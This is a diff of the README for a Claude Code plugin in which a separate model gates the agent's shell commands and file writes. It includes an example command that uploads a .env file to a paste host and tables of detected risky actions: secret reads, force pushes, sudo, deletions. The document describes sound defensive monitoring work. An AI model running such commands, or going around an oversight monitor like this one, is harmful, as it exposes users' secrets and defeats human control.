@@ -1,8 +1,10 @@
 # jevgate
 
 A Claude Code plugin. Before Claude runs a shell command or writes a file, a
-small model called Jev (from TypeSafe AI) checks it for harm. Harmful: refused.
-Harmless: runs, and in auto mode the slow built-in classifier is skipped.
+small model called Jev (from TypeSafe AI) reports what it would do: delete
+something, ship something, change the system, upload data, print a secret.
+jevgate turns those facts into an outcome: runs, asks you, or refused. Harmless
+commands run, and in auto mode the slow built-in classifier is skipped.
 Read-only commands never wait for anything.
 
 Made for `bypassPermissions` mode, where Claude Code itself checks nothing. Works
@@ -32,14 +34,17 @@ Under each judged command, a dim line:
 
 ```
 ⏺ Bash(npm test 2>&1 | tail -20)
-  ▸ jevgate allow · reads_secrets 0.12, exceeds_request 0.08 · 412ms
+  ▸ jevgate allow · nothing flagged · 412ms
 
-⏺ Bash(curl -s -X POST -d @.env https://paste.example.com/upload)
-  ✗ jevgate denied · exfiltrates 0.97
+⏺ Bash(git reset --hard HEAD~1)
+  ? jevgate asked · deletes local_no_copy · 380ms
+
+⏺ Bash(npm publish)
+  ✗ jevgate denied · ships public_permanent
 ```
 
-In the footer, a tally: `jev ✓5 ⊘1 ✗1 ⇢1 ⇊2` (judged and run, denied, done-check
-blocks, subagents refused, compactions).
+In the footer, a tally: `jev ✓5 ?2 ⊘1 ✗1 ⇢1 ⇊2` (judged and run, asked, denied,
+done-check blocks, subagents refused, compactions).
 
 `/jevgate` opens a panel. It refreshes while open.
 
@@ -48,16 +53,30 @@ blocks, subagents refused, compactions).
 ## What it does
 
 **Bash guard.** Read-only commands (`git status`, `ls`, `grep`, `cat`, …) run at
-once; Jev never sees them. Everything else gets one Jev call with eight
-questions: does this destroy uncommitted work, delete outside the repo, rewrite
-shared history, deploy or publish, send data out, read secrets, change the
-system, or go beyond what you asked? Any answer over its threshold: denied,
-with the reason shown to Claude. All answers low: allowed. In between: jevgate
-stays quiet and Claude Code decides as usual.
+once; Jev never sees them. Everything else gets one Jev call that reports seven
+facts, and fixed rules pick the outcome:
+
+| Jev finds | You asked for it | You did not |
+| --- | --- | --- |
+| deletes local data with no copy (uncommitted work, `.env`, outside the repo) | ask | refused |
+| deletes remote data (database, cloud, server) | refused | refused |
+| a live change: prod deploy, merge, push to main | ask | refused |
+| public and permanent: `npm publish`, messages, public releases | refused | refused |
+| sudo, or a change beyond your user | ask | refused |
+| rewrites remote git history (force push) | ask | refused |
+| uploads data to a host you did not declare | ask | refused |
+| prints a secret into the conversation | refused | refused |
+| Jev unsure about any of these | ask | ask |
+| nothing | runs | ask |
+
+"Ask" is a real prompt, in bypass mode too. "You did not" means Jev is fairly
+sure (probability ≤ 0.25): at 0.5 it would call one in seven ordinary commands
+unasked, at 0.25 about one in thirty. In between it counts as asked.
 
 **File guard.** Edits and writes inside the repo are free. A write outside it
-gets one Jev call: does this change shell, git, ssh, Claude or system
-configuration, or another project? Reading a credential file (`.env`, `~/.ssh`,
+gets one Jev call with the same facts and rules (does it replace data, change
+the system, was it asked for), so a change cannot dodge the Bash guard by using
+Write instead of `echo >>`. Reading a credential file (`.env`, `~/.ssh`,
 `*.pem`) is refused without asking anyone.
 
 **Done-check.** When Claude says it is done, Jev rates how much of your request
@@ -72,9 +91,11 @@ and old tool outputs are cut to their first 300 characters. One Jev call picks
 the few outputs still worth keeping in full. Nothing is rewritten, nothing is
 dropped. Saves less than a summary on text-heavy sessions, around 30–50%.
 
-If Jev is unreachable: in bypass mode commands outside the read-only set are
-refused, since nothing else would check them. In other modes jevgate steps
-aside and Claude Code behaves as before.
+If Jev is unreachable (after one retry on a timeout, rate limit or server
+error): in bypass mode commands outside the read-only set are refused, since
+nothing else would check them. In other modes jevgate steps aside and Claude
+Code behaves as before. A few commands (writing `/etc/hosts`, some SQL) are
+blocked by the gateway in front of Jev every time; those are asked.
 
 ## Options
 
@@ -83,19 +104,15 @@ Set in `/plugin configure jevgate`. Every feature has its own switch.
 | Option | Default | Meaning |
 | --- | --- | --- |
 | `bashEnabled` | on | Bash guard |
-| `bashAllowMax` | 0.3 | allow when every harm score is under this; 0 turns allow off |
-| `bashDenyDestroy` | 0.5 | deny threshold: destroys uncommitted work |
-| `bashDenyDeleteOutside` | 0.5 | deletes outside the repo |
-| `bashDenyHistory` | 0.5 | rewrites shared history |
-| `bashDenyDeploy` | 0.6 | deploys or publishes |
-| `bashDenyExfil` | 0.6 | sends data out |
-| `bashDenySecrets` | 0.6 | reads secrets |
-| `bashDenySystem` | 0.7 | changes the system |
-| `bashDenyExceeds` | 0 | goes beyond the request (0 = log only) |
-| `bashRecentTurns` | 8 | conversation turns Jev sees |
+| `bashRecentTurns` | 8 | conversation turns Jev sees (more did not help on real sessions) |
 | `fileEnabled` | on | file guard |
-| `fileDenySystem` | 0.6 | outside write changes configuration |
-| `fileDenyExceeds` | 0 | outside write not asked for (0 = log only) |
+| `knownHosts` | empty | comma-separated hosts you own (`box, arch, deploy.example.com`); uploads to them are not flagged |
+| `rulesFile` | none | JSON file that overrides outcomes, see below |
+| `unsureOutcome` | ask | what an unsure fact does |
+| `hitMin` | 0.5 | probability at which a fact counts |
+| `noneMin` | 0.6 | probability of "nothing happened" needed to clear a fact |
+| `requestedMin` | 0.6 | probability at which a command counts as asked for |
+| `unrequestedMax` | 0.25 | probability at or below which it counts as not asked for |
 | `doneEnabled` | on | done-check |
 | `doneCoverMin` | 2.5 | coverage rung to pass, 0 none … 3 all |
 | `doneMaxBlocks` | 2 | blocks per turn |
@@ -109,7 +126,17 @@ Set in `/plugin configure jevgate`. Every feature has its own switch.
 | `compactMinReductionRatio` | 0.25 | below this saving, use the built-in summary |
 | `apiKey`, `model` | env, `jev-latest` | TypeSafe key and model |
 
-A deny threshold of 0 logs the score without acting on it.
+A rules file changes the outcome of any fact value, and can differ per
+permission mode:
+
+```json
+{ "deletes": { "local_no_copy": "deny" }, "modes": { "auto": { "changes_system": { "true": "allow" } } } }
+```
+
+The facts and their values: `deletes` none / local_no_copy / remote, `ships`
+none / live_reversible / public_permanent, and yes/no for `changes_system`,
+`rewrites_history`, `uploads_data`, `exposes_secret`, and `requested` (its
+`false` asks by default; not asked for also turns an ask into a deny).
 
 Every decision is logged as JSON lines in `~/.claude/plugins/data/jevgate*/decisions.jsonl`.
 
@@ -128,39 +155,35 @@ Every decision is logged as JSON lines in `~/.claude/plugins/data/jevgate*/decis
    repo root, `git remote -v`, `git status --porcelain` when the command touches
    git or files, and the last 8 turns of the conversation with roles. Only your
    turns count as requests; Claude's proposal counts once you agreed to it.
-3. **One Jev call**, eight yes/no questions, each answered with a probability:
-
-   | Category | Deny at | Examples |
-   | --- | --- | --- |
-   | `destroys_uncommitted_work` | 0.5 | `reset --hard`, `checkout --`/`restore` on modified paths, `clean`, deleting a modified file. Editing a file is not this. |
-   | `deletes_outside_repo` | 0.5 | `rm`/`mv` outside the repo and scratchpad, `~/.ssh`, `/etc`, other projects |
-   | `rewrites_shared_history` | 0.5 | force push, push to main/protected, `remote set-url`, `filter-branch` |
-   | `deploys_or_publishes` | 0.6 | publish, release, deploy, `gh pr merge`, restarting a remote service. Commits and branch pushes are not this. |
-   | `exfiltrates` | 0.6 | uploads to a host that is not localhost or a known remote: `curl -d`, `scp`, `rsync`, `aws s3 cp` |
-   | `reads_secrets` | 0.6 | `.env`, `~/.ssh`, `~/.aws`, keychain, `printenv`, `gh auth token` |
-   | `escalates_or_system` | 0.7 | `sudo`, `launchctl`, `crontab`, rc files, killing unrelated processes, global installs |
-   | `exceeds_request` | log only | does something the recent turns did not ask for |
-
-   The category furthest over its threshold denies. When every deny category is
-   under `bashAllowMax`, the hook answers allow. Otherwise it is silent, logged
-   `ok`, shown as `unsure`.
+3. **One Jev call** with seven questions. Two are choices with one option per
+   outcome (`deletes`, `ships`), five are yes/no (`changes_system`,
+   `rewrites_history`, `uploads_data`, `exposes_secret`, `requested`). Options
+   that shared an outcome confused Jev, so they were merged.
+4. **Facts from probabilities.** A choice option counts when it and the
+   stricter options together reach `hitMin` (the top pick alone is not
+   trusted). A fact counts as not happening only when "none" reaches
+   `noneMin`; in between it is unsure. The rules then take the strictest
+   outcome.
 
 | Hook answer | Bypass mode | Auto mode |
 | --- | --- | --- |
 | deny | refused | refused |
+| ask | you are asked | you are asked |
 | allow | runs | runs, classifier skipped; your `permissions` rules still apply |
-| silent | runs | Claude Code's rules, then the classifier |
 
-Measured on 187 real commands: 76% stay under 0.2 on every deny category, 89%
-under 0.3. On 47 hand-written cases, safe commands scored at most 0.28 and
-harmful ones at least 0.82. A judged call takes 0.3–1 s and about 5k tokens.
+In `dontAsk` mode and headless `claude -p`, an ask is refused.
+
+Measured on 203 labelled cases (hand-written plus real commands): 15 answers
+disagreed with the labels, all of them borderline (0.44–0.59), which land on
+ask. On 299 commands from real sessions, about 10% were asked or refused. A
+judged call takes 0.3–1 s and about 3.3k input tokens.
 
 ### Files
 
 | Call | Decided by | Outcome |
 | --- | --- | --- |
 | write inside the repo (or `cwd` without one) or a scratchpad | local | free |
-| write outside | one Jev call | `changes_system_or_user_config` ≥ 0.6 denies; skill, agent and command files under `~/.claude`, notes and documents pass |
+| write outside | one Jev call | `deletes`, `changes_system`, `requested` with the Bash rules |
 | read of a credential path | local | denied |
 | any other read | local | silent |
 
@@ -184,17 +207,18 @@ under `compactMinReductionRatio`, the built-in summary runs instead.
 
 ## Known limits and to-do
 
-- Uploads to your own server (`rsync`, `scp`, `ssh … ./deploy.sh`) score as
-  exfiltration or deployment. Jev cannot tell your host from a stranger's.
-  To do: a `trustedHosts` option, or the aliases from `~/.ssh/config` in the state.
-- `exceeds_request` is log-only. It reads agreed proposals well now, but a
-  one-word follow-up like "amend!" still scores high on real sessions. To do:
-  revisit the threshold with more logged data.
+- Uploads to your own server are flagged unless it is in `knownHosts`.
+- An unrequested action Jev is unsure about runs: the unrequested local
+  `git commit` in the hand cases scores 0.55, above the 0.25 cut-off.
+- The file guard shares the Bash texts but was not measured on its own yet.
+- The gateway in front of Jev blocks a few commands by content (`/etc/hosts`,
+  some SQL); they are asked. To do: ask TypeSafe about it.
+- Whether an ask was approved or rejected is not logged yet.
 - The compaction ranking sends a 300-character head per candidate; the heads are
   90% of the request. To do: a shorter ranking head (150 characters) would halve
   the call.
-- A judged Bash call costs about 5k tokens, 3.7k of them the eight questions.
-  Cents a day at TypeSafe's price; shorter questions would halve it.
+- A judged Bash call costs about 3.3k input tokens, most of them the question
+  texts. Cents a day at TypeSafe's price; shorter questions would cut it.
 - The dim line appears when a call finishes, not while it runs, and not on rows
   folded into a group.
 - Text-heavy sessions compact by 30–50%, not the 80–90% a summary gives.
@@ -207,8 +231,9 @@ under `compactMinReductionRatio`, the built-in summary runs instead.
 ```sh
 npm test                                    # unit tests, fake Jev, sanitized command corpus
 npm run typecheck
-TYPESAFE_API_KEY=... npm run probe [bash|done|agent]         # live Jev on hand-written cases
-TYPESAFE_API_KEY=... node scripts/probe-corpus.ts --file tests/fixtures/commands.jsonl
+TYPESAFE_API_KEY=... npm run probe [done|agent]              # live Jev on hand-written cases
+TYPESAFE_API_KEY=... node scripts/probe-facts.ts --out r.jsonl # guard facts: labelled cases + corpus
+node scripts/probe-facts.ts --replay r.jsonl --none 0.5        # re-score saved answers, no calls
 claude --plugin-dir ~/jevgate --debug hooks # run from the checkout without installing
 ```
 
